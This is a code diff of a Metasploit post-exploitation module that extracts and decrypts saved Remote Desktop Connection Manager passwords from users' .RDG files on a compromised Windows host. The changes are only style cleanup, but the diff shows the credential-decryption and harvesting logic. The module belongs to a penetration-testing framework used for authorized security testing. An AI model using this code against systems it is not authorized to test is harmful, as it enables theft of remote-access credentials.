@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 
 ##
@@ -11,30 +12,28 @@ require 'rexml/document'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
-        'Description'   => %q{
-          This module extracts and decrypts saved Microsoft Remote Desktop
-          Connection Manager (RDCMan) passwords the .RDG files of users.
-          The module will attempt to find the files configured for all users
-          on the target system. Passwords for managed hosts are encrypted by
-          default.  In order for decryption of these passwords to be successful,
-          this module must be executed under the same account as the user which
-          originally encrypted the password.  Passwords stored in plain text will
-          be captured and documented.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Remote Desktop Connection Manager Saved Password Extraction',
+                      'Description'   => %q{
+                        This module extracts and decrypts saved Microsoft Remote Desktop
+                        Connection Manager (RDCMan) passwords the .RDG files of users.
+                        The module will attempt to find the files configured for all users
+                        on the target system. Passwords for managed hosts are encrypted by
+                        default.  In order for decryption of these passwords to be successful,
+                        this module must be executed under the same account as the user which
+                        originally encrypted the password.  Passwords stored in plain text will
+                        be captured and documented.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def run
@@ -81,7 +80,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86"}
+    if session.sys.process.each_process.find { |i| i["pid"] == pid && i["arch"] == "x86" }
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
@@ -95,7 +94,7 @@ class MetasploitModule < Msf::Post
 
     return "" if len == 0
     decrypted_pw = process.memory.read(addr, len)
-    return decrypted_pw
+    decrypted_pw
   end
 
   def extract_password(object)
@@ -128,7 +127,7 @@ class MetasploitModule < Msf::Post
       username, password, domain = extract_password(parent)
     end
 
-    return username, password, domain
+    [username, password, domain]
   end
 
   def parse_connections(connection_data)
@@ -138,11 +137,11 @@ class MetasploitModule < Msf::Post
     doc.elements.each("//server") do |server|
       svr_name = server.elements['name'].text
       username, password, domain = extract_password(server)
-      if server.elements['connectionSettings'].attributes['inherit'] == "None"
-        port = server.elements['connectionSettings'].elements['port'].text
-      else
-        port = 3389
-      end
+      port = if server.elements['connectionSettings'].attributes['inherit'] == "None"
+               server.elements['connectionSettings'].elements['port'].text
+             else
+               3389
+             end
 
       print_status("\t\t#{svr_name} \t#{username} #{password} #{domain}")
       register_creds(svr_name, username, password, domain, port) if password || username
@@ -164,11 +163,11 @@ class MetasploitModule < Msf::Post
       end
 
       parent = gateway.parent
-      if parent.elements['connectionSettings'].attributes['inherit'] == "None"
-        port = parent.elements['connectionSettings'].elements['port'].text
-      else
-        port = 3389
-      end
+      port = if parent.elements['connectionSettings'].attributes['inherit'] == "None"
+               parent.elements['connectionSettings'].elements['port'].text
+             else
+               3389
+             end
 
       print_status("\t\t#{svr_name} \t#{username} #{password} #{domain}")
       register_creds(svr_name, username, password, domain, port) if password || username
@@ -193,7 +192,7 @@ class MetasploitModule < Msf::Post
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_data: pass,
       private_type: :password,
       username: user,
